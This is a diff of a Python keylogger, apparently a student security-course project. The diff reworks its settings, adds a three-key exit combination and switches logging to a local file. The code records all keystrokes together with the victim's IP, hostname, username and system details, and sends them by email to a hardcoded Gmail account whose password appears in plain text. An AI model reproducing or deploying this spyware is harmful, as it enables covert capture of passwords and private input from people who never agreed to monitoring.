@@ -10,13 +10,31 @@ import socket
 import getpass
 import platform
 
-destEmail = 'keylogsenderUIUC460@gmail.com' #Destination Email 
-srcEmail = "keylogsenderUIUC460" #Emails will be sent from this email account 
-srcPwd =  "qazwsxedcrfv"
-dataBufferSize = 500 #Emails will be sent out after this many characters have been collected (note "[CTRL]" is 6 chars)
+#Destination Email 
+destEmail = 'keylogsenderUIUC460@gmail.com'
 
-local = False #If this is True then keystrokes will be logged to file instead of email
-exit_key = keyboard.Key.esc
+#Emails will be sent from this email account 
+srcEmail = "keylogsenderUIUC460" 
+srcPwd =  "qazwsxedcrfv"
+
+#Emails will be sent out after this many characters have been collected (note "[CTRL]" is 6 chars)
+dataBufferSize = 500 
+
+#Exit program by pressing these buttons at the same time
+#You can customize this by adding :
+#"Key.Special_key" (Refer to the dictionary in filterKeys()
+# or 
+#"u'LETTER'" (notice the use of single quotation marks) 
+exit_keys = { 
+	"Key.ctrl_l": False,
+	"Key.shift_r": False,
+	"Key.space": False,
+}
+
+
+#If this is True then keystrokes will be logged to file instead of email
+local = True 
+#DO NOT TOCUH: Internal Variables 	
 end_program= False
 data = ""
 q = Queue.Queue()
@@ -46,22 +64,22 @@ def filterKeys(letter):
 		'Key.page_down': '[PAGEDOWN]',
 		'Key.cmd': '[WINDOWSKEY]',
 		'Key.menu': '[MENU]',
-                'Key.up': '[UP]',
-                'Key.down': '[DOWN]',
-                'Key.left': '[LEFT]',
-                'Key.right': '[RIGHT]',
-                'Key.f1': '[F1]',
-                'Key.f2': '[F2]',
-                'Key.f3': '[F3]',
-                'Key.f4': '[F4]',
-                'Key.f5': '[F5]',
-                'Key.f6': '[F6]',
-                'Key.f7': '[F7]',
-                'Key.f8': '[F8]',
-                'Key.f9': '[F9]',
-                'Key.f10': '[F10]',
-                'Key.f11': '[F11]',
-                'Key.f12': '[F12]',
+		'Key.up': '[UP]',
+		'Key.down': '[DOWN]',
+		'Key.left': '[LEFT]',
+		'Key.right': '[RIGHT]',
+		'Key.f1': '[F1]',
+		'Key.f2': '[F2]',
+		'Key.f3': '[F3]',
+		'Key.f4': '[F4]',
+		'Key.f5': '[F5]',
+		'Key.f6': '[F6]',
+		'Key.f7': '[F7]',
+		'Key.f8': '[F8]',
+		'Key.f9': '[F9]',
+		'Key.f10': '[F10]',
+		'Key.f11': '[F11]',
+		'Key.f12': '[F12]',
                 
 	}
 	return replacements.get(letter,letter)
@@ -84,11 +102,12 @@ def send_data(msg, victimInfo):
                 fullmsg =       ('\nSource IP: ' + str(IP) +
                                 '\nHostName: ' + str(HostName) +
                                 '\nUserName: ' + str(UserName) +
-                                '\n\nSystem Info: \n\n' + str(Machine) +
-                                '\n\n\n\n' + str(msg))
-		print('Message: \n\n' + fullmsg)
+                                '\n\n---System Info:---- \n' + str(Machine) +
+                                '\n\n---Message---\n' + str(msg))
+		print('\n----------------- \nData:' + fullmsg+'\n----------\n')
 		
 		if(local):
+			global f
 			print('sending data through LOG FILE')
 			f.write('{0}'.format(fullmsg))	
 		else:
@@ -113,20 +132,29 @@ def recordKey(key, release=False):
 			if(len(data) > dataBufferSize):
 				q.put(data)
 				data = ""
-
+def prepare_end():
+		global end_program
+		end_program = True
+		print("Ending Program...")
 def on_press(key):
 	print(key)
+	global exit_keys
+	if(str(key) in exit_keys):
+		exit_keys[str(key)] = True 
+		print(exit_keys)
+		if(all(exit_key_held == True for exit_key_held in exit_keys.values())):
+			prepare_end() 
+			return False	
 	recordKey(key)
 
 def on_release(key, release=True):
-	global data, end_program
-	if(key == exit_key): #exit
-		end_program = True
-		
-		return False
+	global data, end_program, ctrl_held
+	if(str(key) in exit_keys):
+		exit_keys[str(key)] = False
 	try:
 		if(str(key) in holdDowns):
 			recordKey(key, release=True)
+	
 	except Exception as e:
 		print('Exception: '+ str(e))
 
@@ -160,9 +188,9 @@ def capture_info():
         return info
 
 def run_sender():
-        victimInfo = capture_info();
-        
+	victimInfo = capture_info() 
 	if(local):
+		global f
 		f = open('keylog.txt', 'w')
 		print("logging to file...")
 	else:
